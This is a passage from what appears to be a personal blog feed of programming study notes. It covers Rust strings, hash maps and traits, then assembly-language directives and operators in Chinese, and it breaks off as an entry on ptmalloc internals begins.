class="hljs-string">&#x27;l&#x27;</span>);<span class="hljs-comment">//push single character and single quote</span><br>s = s1 + s2;<span class="hljs-comment">//the &#x27;+&#x27; operation use the add() method</span><br></code></pre></div></td></tr></table></figure><ul><li>pay attention to the ownership taking</li></ul><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-keyword">let</span> <span class="hljs-keyword">mut</span> s1 = <span class="hljs-built_in">String</span>::from(<span class="hljs-string">&quot;foo&quot;</span>);<br><span class="hljs-keyword">let</span> s2 = <span class="hljs-string">&quot;bar&quot;</span>;<br>s1.push_str(s2);<br><span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;s2 is &#123;&#125;&quot;</span>, s2);<br></code></pre></div></td></tr></table></figure><ul><li><em><strong>deref coercion</strong></em>: why does the first line compile ? Because Rust compiler can coerce <code>&amp;String</code> into a <code>&amp;str</code> </li></ul><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-keyword">let</span> s3 = s1 + &amp;s2;<span class="hljs-comment">//they are all strings, compiler turns &amp;s2 into &amp;s2[..], and s1 has been moved </span><br><br><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">add</span></span>(<span class="hljs-keyword">self</span>, s: &amp;<span class="hljs-built_in">str</span>) -&gt; <span class="hljs-built_in">String</span> &#123;<span class="hljs-comment">//add&#x27;s signature, s1 don&#x27;t have &#x27;&amp;&#x27; which will take the ownership</span><br></code></pre></div></td></tr></table></figure><ul><li>For more complicated string <strong>combining</strong>, we can use the <code>format!</code> macro</li></ul><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">main</span></span>() &#123;<br>    <span class="hljs-keyword">let</span> s1 = <span class="hljs-built_in">String</span>::from(<span class="hljs-string">&quot;tic&quot;</span>);<br>    <span class="hljs-keyword">let</span> s2 = <span class="hljs-built_in">String</span>::from(<span class="hljs-string">&quot;tac&quot;</span>);<br>    <span class="hljs-keyword">let</span> s3 = <span class="hljs-built_in">String</span>::from(<span class="hljs-string">&quot;toe&quot;</span>);<br><span class="hljs-comment">//format! macro uses references so that this call doesn’t take ownership of any of its parameters.</span><br>    <span class="hljs-keyword">let</span> s = <span class="hljs-built_in">format!</span>(<span class="hljs-string">&quot;&#123;&#125;-&#123;&#125;-&#123;&#125;&quot;</span>, s1, s2, s3);<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="INDEXING"><a href="#INDEXING" class="headerlink" title="INDEXING"></a>INDEXING</h3><ul><li>try to index will lead to an error, because String is a wrapper of Vec&lt;u8&gt; </li><li>You must use range syntax like :</li></ul><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-keyword">let</span> hello = <span class="hljs-string">&quot;Здравствуйте&quot;</span>;<br><span class="hljs-keyword">let</span> s = &amp;hello[<span class="hljs-number">0</span>..<span class="hljs-number">4</span>];<br></code></pre></div></td></tr></table></figure><p>​        But you can’t simply use the &amp;hello[0..1]  because index 1 is not a char boundary.</p><ul><li>Use for_in_ to iterating over strings.</li></ul><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;नमस्ते&quot;</span>.chars() &#123;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>, c);<br>&#125;<br><span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;नमस्ते&quot;</span>.bytes() &#123;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>, b);<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li>This trade-off exposes more of the complexity of strings than is apparent in other programming languages, but it prevents you from having to handle errors involving non-ASCII characters later in your development life cycle.</li></ul><h2 id="hash-map"><a href="#hash-map" class="headerlink" title="hash map"></a>hash map</h2><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-keyword">use</span> std::collections::HashMap;<br><br><span class="hljs-comment">// 创建一个HashMap，用于存储宝石种类和对应的数量</span><br><span class="hljs-keyword">let</span> <span class="hljs-keyword">mut</span> my_gems = HashMap::new();<br><span class="hljs-comment">//或者创建指定大小的map, 提高使用性能</span><br><span class="hljs-keyword">let</span> <span class="hljs-keyword">mut</span> blank = HashMap::with_capacity(capacity)<br><br><span class="hljs-comment">// 将宝石类型和对应的数量写入表中</span><br>my_gems.insert(<span class="hljs-string">&quot;红宝石&quot;</span>, <span class="hljs-number">1</span>);<br>my_gems.insert(<span class="hljs-string">&quot;蓝宝石&quot;</span>, <span class="hljs-number">2</span>);<br>my_gems.insert(<span class="hljs-string">&quot;河边捡的误以为是宝石的破石头&quot;</span>, <span class="hljs-number">18</span>);<br><br><span class="hljs-comment">//从vec teams_list到hashmap teams_map. 下划线表示编译器自动推导. </span><br><span class="hljs-keyword">let</span> teams_map: HashMap&lt;_,_&gt; = teams_list.into_iter().collect();<br><br></code></pre></div></td></tr></table></figure><p>HashMap 的所有权规则与其它 Rust 类型没有区别：</p><ul><li>若类型实现 <code>Copy</code> 特征，该类型会被复制进 <code>HashMap</code>，因此无所谓所有权</li><li>若没实现 <code>Copy</code> 特征，所有权将被转移给 <code>HashMap</code> 中</li></ul><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust">std::mem::<span class="hljs-built_in">drop</span>(name);<br></code></pre></div></td></tr></table></figure><h1 id="Error-Handling"><a href="#Error-Handling" class="headerlink" title="Error Handling"></a><a href="https://doc.rust-lang.org/book/ch09-00-error-handling.html#error-handling">Error Handling</a></h1><ul><li>Rust group errors into two categories: <em>recoverable and unrecoverable errors</em>. Most languages don’t distinguish these two kinds of errors, using mechanism such as exceptions. <strong>Rust don’t have exceptions</strong>. Instead, it has the type <code>Result&lt;T, E&gt;</code> for recoverable errors and the <code>panic!</code> macro that stops execution when the program encounters an unrecoverable error.</li></ul><h1 id="Generic-Types-Traits-and-Lifetimes"><a href="#Generic-Types-Traits-and-Lifetimes" class="headerlink" title="Generic Types, Traits, and Lifetimes"></a>Generic Types, Traits, and Lifetimes</h1><ul><li>we can restrict the types valid for <code>T</code> to only those that implement <code>PartialOrd</code>(or std::fmt::Debug below)<br>so that can implement generic comparation.</li></ul><p>const 泛型: 对值的泛型.</p><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">display_array</span></span>&lt;T: std::fmt::<span class="hljs-built_in">Debug</span>, <span class="hljs-keyword">const</span> N: <span class="hljs-built_in">usize</span>&gt;(arr: [T; N]) &#123;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;:?&#125;&quot;</span>, arr);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">main</span></span>() &#123;<br>    <span class="hljs-keyword">let</span> arr: [<span class="hljs-built_in">i32</span>; <span class="hljs-number">3</span>] = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];<br>    display_array(arr);<br><br>    <span class="hljs-keyword">let</span> arr: [<span class="hljs-built_in">i32</span>; <span class="hljs-number">2</span>] = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>];<br>    display_array(arr);<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li><p>A <em><strong>trait</strong></em> defines functionality a particular type has and can share with other types.</p><ul><li><strong>孤儿规则</strong>: 如果你想要为类型 <code>A</code> 实现特征 <code>T</code>，那么 <code>A</code> 或者 <code>T</code> 至少有一个是在当前作用域中定义的, 这样别人的代码不会影响你的代码.</li><li>特征可以有默认实现. </li></ul><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-keyword">pub</span> <span class="hljs-class"><span class="hljs-keyword">trait</span> <span class="hljs-title">Summary</span></span> &#123;<br>    <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">summarize</span></span>(&amp;<span class="hljs-keyword">self</span>) -&gt; <span class="hljs-built_in">String</span> &#123;<br>        <span class="hljs-built_in">String</span>::from(<span class="hljs-string">&quot;(Read more...)&quot;</span>)<br>    &#125;<br>&#125;<br><span class="hljs-keyword">impl</span> Summary <span class="hljs-keyword">for</span> Weibo &#123; ...... &#125; <span class="hljs-comment">//为Weibo实现Summary特征</span><br></code></pre></div></td></tr></table></figure><ul><li>特征参数. 形如 <code>T: Summary</code> 被称为<strong>特征约束</strong>. </li></ul><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-keyword">pub</span> <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">notify</span></span>(item: &amp;<span class="hljs-keyword">impl</span> Summary) &#123;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Breaking news! &#123;&#125;&quot;</span>, item.summarize());<br>&#125;<br><span class="hljs-comment">//上面的语法糖等同于</span><br><span class="hljs-keyword">pub</span> <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">notify</span></span>&lt;T: Summary&gt;(item: &amp;T) &#123; ...... &#125;<br><span class="hljs-comment">//优势在可以使两个参数都为同一类型.</span><br><span class="hljs-keyword">pub</span> <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">notify</span></span>&lt;T: Summary&gt;(item1: &amp;T, item2: &amp;T) &#123;&#125;<br><span class="hljs-comment">//多重约束</span><br><span class="hljs-keyword">pub</span> <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">notify</span></span>(item: &amp;(<span class="hljs-keyword">impl</span> Summary + Display)) &#123;&#125;<br><span class="hljs-keyword">pub</span> <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">notify</span></span>&lt;T: Summary + Display&gt;(item: &amp;T) &#123;&#125;<br><span class="hljs-comment">//where约束简化复杂约束.</span><br><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">some_function</span></span>&lt;T, U&gt;(t: &amp;T, u: &amp;U) -&gt; <span class="hljs-built_in">i32</span><br>    <span class="hljs-keyword">where</span> T: Display + <span class="hljs-built_in">Clone</span>,<br>          U: <span class="hljs-built_in">Clone</span> + <span class="hljs-built_in">Debug</span><br>&#123;&#125;<br></code></pre></div></td></tr></table></figure><ul><li>待看. </li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>programming_language</category>
      
    </categories>
    
    
    <tags>
      
      <tag>programming_language</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Assembly Language</title>
    <link href="/2021-08/pwn-start-Assembly/"/>
    <url>/2021-08/pwn-start-Assembly/</url>
    
    <content type="html"><![CDATA[<h1 id="整这些有的没的不如看gas的官方文档"><a href="#整这些有的没的不如看gas的官方文档" class="headerlink" title="整这些有的没的不如看gas的官方文档"></a>整这些有的没的不如看gas的<a href="https://sourceware.org/binutils/docs-2.38/as/index.html">官方文档</a></h1><p>现在主要用到的就是gas, 所以整点gas基础的东西.</p><ul><li><strong>If the symbol begins with a letter the statement is an assembly language <em>instruction</em></strong>  </li><li></li></ul><hr><h1 id="汇编语言伪指令-最要命的"><a href="#汇编语言伪指令-最要命的" class="headerlink" title="汇编语言伪指令(最要命的"></a>汇编语言伪指令(最要命的</h1><blockquote><ul><li>伪指令 (directive) 是嵌入源代码中的命令，由汇编器识别和执行。伪指令不在运行时执行，但是它们可以定义变量、宏和子程序；为内存段分配名称，执行许多其他与汇编器相关的日常任务。</li><li>简单来说就是方便编程的指令 </li></ul></blockquote><h2 id="基本"><a href="#基本" class="headerlink" title="基本:"></a>基本:</h2><ul><li><code>.data     .code     .stack</code> 定义段(segment)</li><li><code>.model flat,stdcall</code>它告诉汇编程序用的是哪一种存储模式</li><li><code>.END</code>标记一个程序的结束</li></ul><h2 id="数据类型及伪指令"><a href="#数据类型及伪指令" class="headerlink" title="数据类型及伪指令"></a>数据类型及伪指令</h2><h3 id="数据定义"><a href="#数据定义" class="headerlink" title="数据定义"></a>数据定义</h3><table><thead><tr><th>类型</th><th>用法</th></tr></thead><tbody><tr><td>BYTE</td><td>8 位无符号整数，B 代表字节</td></tr><tr><td>SBYTE</td><td>8 位有符号整数，S 代表有符号</td></tr><tr><td>WORD</td><td>16 位无符号整数</td></tr><tr><td>SWORD</td><td>16 位有符号整数</td></tr><tr><td>DWORD</td><td>32 位无符号整数，D 代表双（字）</td></tr><tr><td>SDWORD</td><td>32 位有符号整数，SD 代表有符号双（字）</td></tr><tr><td>FWORD</td><td>48 位整数（保护模式中的远指针）</td></tr><tr><td>QWORD</td><td>64 位整数，Q 代表四（字）</td></tr><tr><td>TBYTE</td><td>80 位（10 字节）整数，T 代表 10 字节</td></tr><tr><td>REAL4</td><td>32 位（4 字节）IEEE 短实数</td></tr><tr><td>REAL8</td><td>64 位（8 字节）IEEE 长实数</td></tr><tr><td>REAL10</td><td>80 位（10 字节）IEEE 扩展实数</td></tr></tbody></table><p>还可以是传统数据定义伪指令，如下表所示。</p><table><thead><tr><th>伪指令</th><th>用法</th><th>伪指令</th><th>用法</th></tr></thead><tbody><tr><td>DB</td><td>8位整数</td><td>DQ</td><td>64 位整数或实数</td></tr><tr><td>DW</td><td>16 位整数</td><td>DT</td><td>定义 80 位（10 字节）整数</td></tr><tr><td>DD</td><td>32 位整数或实数</td><td></td><td></td></tr></tbody></table><p>初始化语句</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">[name] directive initializer [,initializer]...<br></code></pre></div></td></tr></table></figure><p>如果希望不对变量进行初始化（随机分配数值），可以用符号 ? 作为初始值, 所有数值都由汇编器来转成二进制数据</p><ul><li><p>BYTE and SBYTE</p><ul><li>多初始值定义数组</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">list BYTE 10,20,30,40<br>#甚至可以:<br>list BYTE 10,20,30,40<br>     BYTE 50,60,70,80<br>     BYTE 81,82,83,84<br></code></pre></div></td></tr></table></figure><ul><li>定义字符串: 使用BYTE, </li></ul><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">greeting1 BYTE &quot;Good afternoon&quot;,0<br>#也可以<br>greeting1 BYTE &quot;Welcome to the Encryption Demo program &quot;<br>          BYTE &quot;created by Kip Irvine.&quot;,0dh, 0ah<br>#还可以使用backslash分行<br></code></pre></div></td></tr></table></figure><ul><li>DUP 操作符: 使用一个整数表达式作为计数器，为多个数据项分配存储空间</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm"> BYTE 4 DUP ( &quot;STACK&quot; ) ; 20 个字节：<br>#第一个数字是BYTE的个数, 第二个数字由DUP计算得出, 单位是字节    <br>#提供了一种方便的方式来初始化数组:<br>array BYTE 5 DUP (?) ; 5 个数值，未初始化<br></code></pre></div></td></tr></table></figure></li><li><p>WORD and SWORD, DWORD, SDWORD, QWORD, </p></li><li><p>同BYTE和SBYTE</p></li><li><p>剩下还有浮点类型, BCD数据等等, 不看了</p></li></ul><hr><ul><li><p><code>.DATA ?</code>伪指令声明未初始化数据。当定义大量未初始化数据时，.DATA ? 伪指令减少了编译程序的大小。</p></li><li><p>等号=伪指令, 相当于宏定义一个数据, 可多次重复定义</p></li><li><p>当前地址计数器:<strong><code>selfPtr DWORD $</code></strong> </p></li><li><p>让汇编器计算数组长度: </p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">list BYTE 10,20,30,40<br>ListSize = ($ - list) # 注意此时计算出来的是地址的差值, 所以单位是字节, 如果遇到WORD要注<br></code></pre></div></td></tr></table></figure></li><li><p>EQU伪指令, 无法多次定义</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">name EQU expression    #必须是整数表达式<br>name EQU symbol        #任意一个用EQU或=定义过的符号<br>name EQU &lt;text&gt;        #直接文本替换, 最像#define, 也可用来定义实数<br></code></pre></div></td></tr></table></figure></li><li><p>TEXTEQU 文本宏伪指令, </p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">name TEXTEQU &lt;text&gt;            # 就是文本<br>name TEXTEQU textmacro        # 前面的文本宏<br>name TEXTEQU %constExpr        # 整数表达式<br></code></pre></div></td></tr></table></figure></li></ul><h3 id="相关指令"><a href="#相关指令" class="headerlink" title="相关指令"></a>相关指令</h3><p>操作数有 3 种基本类型：</p><ul><li>立即数——用数字文本表达式</li><li>寄存器操作数——使用 CPU 内已命名的寄存器</li><li>内存操作数——引用内存位置</li></ul><table><thead><tr><th>操作数</th><th>说明</th></tr></thead><tbody><tr><td>reg8</td><td>8 位通用寄存器：AH、AL、BH、BL、CH、CL、DH、DL</td></tr><tr><td>reg16</td><td>16 位通用寄存器：AX、BX、CX、DX、SI、DI、SP、BP</td></tr><tr><td>reg32</td><td>32 位通用寄存器：EAX、EEX、ECX、EDX、ESI、EDI、ESP、EBP</td></tr><tr><td>reg</td><td>通用寄存器</td></tr><tr><td>sreg</td><td>16 位段寄存器：CS、DS、SS、ES、FS、GS</td></tr><tr><td>imm</td><td>8 位、16 位或 32 位立即数</td></tr><tr><td>imm8</td><td>8 位立即数，字节型数值</td></tr><tr><td>imm16</td><td>16 位立即数，字类型数值</td></tr><tr><td>imm32</td><td>32 位立即数，双字型数值</td></tr><tr><td>reg/mem8</td><td>8 位操作数，可以是 8 位通用寄存器或内存字节</td></tr><tr><td>reg/mem16</td><td>16 位立即数，可以是 16 位通用寄存器或内存字</td></tr><tr><td>reg/mem32</td><td>32 位立即数，可以是 32 位通用寄存器或内存双字</td></tr><tr><td>mem</td><td>8位、16 位或 32 位内存操作数</td></tr></tbody></table><hr><p>4.9 <a href="http://c.biancheng.net/view/3514.html">OFFSET运算符</a> : 表示的是该数据标号距离数据段起始地址的距离</p><p>4.10 <a href="http://c.biancheng.net/view/3515.html">ALIGN伪指令</a> 1,2,4,8,16字节对齐</p><p>4.11 <a href="http://c.biancheng.net/view/3516.html">PTR运算符</a> </p><ul><li><p><code>mov ax,WORD PTR myDouble</code>, 把一个DWORD的低两字节传入ax(因为是小端法存储, 而且可用偏移来传入<br>高两字节:<code>mov ax,WORD PTR [myDouble+2]</code>)</p></li><li><p>把两个小的移入大的: </p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">wordList WORD 5678h,1234h<br>mov eax, DWORD PTR wordList<br></code></pre></div></td></tr></table></figure></li></ul><p>4.12 <a href="http://c.biancheng.net/view/3517.html">TYPE运算符</a> 返回变量的大小</p><p>4.13 <a href="http://c.biancheng.net/view/3518.html">LENGTHOF运算符 </a> 计算数组中元素的个数, 如果数组占据多行, 只计算第一行</p><p>4.14 <a href="http://c.biancheng.net/view/3519.html">LABEL伪指令</a> 可以插入一个标号，并定义它的大小属性，但是不为这个标号分配存储空间<br>        <code>LongValue LABEL DWORD</code> 标识下一个地址开始的DWORD字节</p><p>4.15 <a href="http://c.biancheng.net/view/3525.html">间接寻址</a> 特殊: <code>inc BYTE PTR [esi]</code> 要加指针的类型, 剩下的有很多, 详见网站</p><p>4.16 <a href="http://c.biancheng.net/view/3528.html">JMP和LOOP指令</a> 这个loop集成了ECX以及其他一些指令, 要看的话详见网站</p><h2 id="汇编语言过程"><a href="#汇编语言过程" class="headerlink" title="汇编语言过程"></a>汇编语言过程</h2><ul><li><p>压栈出栈, push&amp;pop</p></li><li><p>PUSHFD 和 POPFD 指令: 压入和弹出EFLAGS寄存器</p></li><li><p>PUSHA (push all-16bits), PUSHAD (push all double-32bits),  POPAD 和 POPA</p></li><li><p><strong>PROC和ENDP ：定义一个过程</strong> </p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">main PROC<br>.<br>.<br>main ENDP<br></code></pre></div></td></tr></table></figure><ul><li>标号只有过程中的有效, 不过也可以定义全局标号<code>Destination::</code>, 使用两个引号即可, 尽量少用</li></ul></li><li><p>USES 运算符: 在PROC 伪指令一行后面指出当前过程要修改的寄存器, 汇编器在头尾自动生成push和pop指令, 只对汇编器有效</p></li><li><p>链接库跳过</p></li></ul><h2 id="条件判断"><a href="#条件判断" class="headerlink" title="条件判断"></a>条件判断</h2><table><thead><tr><th>操作</th><th>说明</th></tr></thead><tbody><tr><td>AND</td><td>源操作数和目的操作数进行逻辑与操作</td></tr><tr><td>OR</td><td>源操作数和目的操作数进行逻辑或操作</td></tr><tr><td>XOR</td><td>源操作数和目的操作数进行逻辑异或操作</td></tr><tr><td>NOT</td><td>对目标操作数进行逻辑非操作</td></tr><tr><td>TEST</td><td>源操作数和目的操作数进行逻辑与操作，并适当地设置 CPU 标志位</td></tr></tbody></table><ul><li>置位和清除零标志位、符号标志位、进位标志位和溢出标志位的<a href="http://c.biancheng.net/view/3563.html">方法</a> </li><li>汇编语言64位模式下的布尔指令: <ul><li>32 位操作数是一个特殊的情况，需要与其他大小操作数的情况分开考虑。</li></ul></li><li>条件跳转<ul><li>注意无符号数和有符号数的比较是不同的.</li><li></li></ul></li><li>…</li></ul><h2 id="整数运算"><a href="#整数运算" class="headerlink" title="整数运算"></a>整数运算</h2><ol><li><p><a href="http://c.biancheng.net/view/3589.html">汇编语言移位和循环移位指令简介</a> </p></li><li><p><a href="http://c.biancheng.net/view/3590.html">汇编语言SHL（左移）指令：将操作数逻辑左移一位</a> </p></li><li><p><a href="http://c.biancheng.net/view/3591.html">汇编语言SHR（右移）指令：将操作数逻辑右移一位</a> </p></li><li><p><a href="http://c.biancheng.net/view/3592.html">汇编语言SAL（算术左移）和SAR（算术右移）指令：将操作数左</a> </p></li><li><p><a href="http://c.biancheng.net/view/3593.html">汇编语言ROL（循环左移）指令：将操作数所有位都向左移</a> </p></li><li><p><a href="http://c.biancheng.net/view/3595.html">汇编语言ROR（循环右移）指令：将操作数所有位都向右移</a> </p></li><li><p><a href="http://c.biancheng.net/view/3596.html">汇编语言RCL（带进位循环左移）和RCR（带进位循环右移）指令</a> </p></li><li><p><a href="http://c.biancheng.net/view/3597.html">汇编语言SHLD（双精度左移）和SHRD（双精度右移）指令</a> </p></li><li><p><a href="http://c.biancheng.net/view/3600.html">汇编语言移位和循环移位的应用</a> </p></li><li><p><a href="http://c.biancheng.net/view/3602.html">汇编语言MUL指令：无符号数乘法</a> </p></li><li><p><a href="http://c.biancheng.net/view/3603.html">汇编语言IMUL指令：有符号数乘法</a> </p></li><li><p><a href="http://c.biancheng.net/view/3605.html">汇编语言GetMseconds：测量程序执行时间</a> </p></li><li><p><a href="http://c.biancheng.net/view/3606.html">汇编语言DIV指令：无符号除法</a> </p></li><li><p><a href="http://c.biancheng.net/view/3609.html">汇编语言IDICV指令：有符号数除法</a> </p></li><li><p><a href="http://c.biancheng.net/view/3610.html">使用汇编语言实现算术表达式[实例]</a> </p></li><li><p><a href="http://c.biancheng.net/view/3611.html">汇编语言ADC指令：带进位加法</a> </p></li><li><p><a href="http://c.biancheng.net/view/3612.html">汇编语言SBB指令：带借位减法</a> </p></li><li><p><a href="http://c.biancheng.net/view/3614.html">汇编语言ASCII和非压缩十进制运算</a> </p></li><li><p><a href="http://c.biancheng.net/view/3615.html">汇编语言AAA指令：调整ADD或ADC指令的二进制运算结果 </a> </p></li><li><p><a href="http://c.biancheng.net/view/3616.html">汇编语言AAS指令：减法后的ASXII调整</a> </p></li><li><p><a href="http://c.biancheng.net/view/3617.html">汇编语言AAM（乘法后的ASCII调整）和AAD（除法之前的ASCII调整）指</a> </p></li><li><p><a href="http://c.biancheng.net/view/3619.html">汇编语言压缩十进制运算简介</a> </p></li><li><p><a href="http://c.biancheng.net/view/3621.html">汇编语言DAA指令：加法后的十进制调整</a> </p></li><li><p><a href="http://c.biancheng.net/view/3622.html">汇编语言DAS指令：减法后的十进制调整</a> </p></li></ol><h2 id="汇编语言高级过程"><a href="#汇编语言高级过程" class="headerlink" title="汇编语言高级过程"></a>汇编语言高级过程</h2>]]></content>
    
    
    <categories>
      
      <category>programming_language</category>
      
    </categories>
    
    
    <tags>
      
      <tag>programming_language</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ptmalloc src &amp; techniques</title>
    <link href="/2021-08/Now-ptmalloc-exp/"/>
    <url>/2021-08/Now-ptmalloc-exp/</url>
    
    <content type="html"><![CDATA[<h1 id="基本数据结构及函数"><a href="#基本数据结构及函数" class="headerlink" title="基本数据结构及函数"></a>基本数据结构及函数</h1><h2 id="管理chunk"><a href="#管理chunk" class="headerlink" title="管理chunk"></a>管理chunk</h2><h3 id="Size-and-alignment-checks-and-conversions"><a href="#Size-and-alignment-checks-and-conversions" class="headerlink" title="Size and alignment checks and conversions"></a>Size and alignment <code>checks</code> and conversions</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span 